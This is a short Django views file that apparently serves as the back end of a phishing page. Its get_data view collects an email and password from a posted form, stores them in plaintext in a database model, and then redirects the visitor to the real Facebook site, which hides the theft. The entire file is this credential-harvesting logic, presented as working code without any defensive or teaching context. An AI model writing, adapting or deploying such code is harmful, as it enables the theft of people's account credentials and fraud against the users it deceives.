from django.shortcuts import render, redirect
from .models import Info

# Create your views here.
def main(request):
    return render(request, 'index.html')

def get_data(request):
    if request.method == "POST":
        email = request.POST.get('email')
        password = request.POST.get('password')

        if email and password:
            data = Info(email=email, password=password)
            data.save()
            return redirect('https://www.facebook.com')
        else:
            return redirect('main')
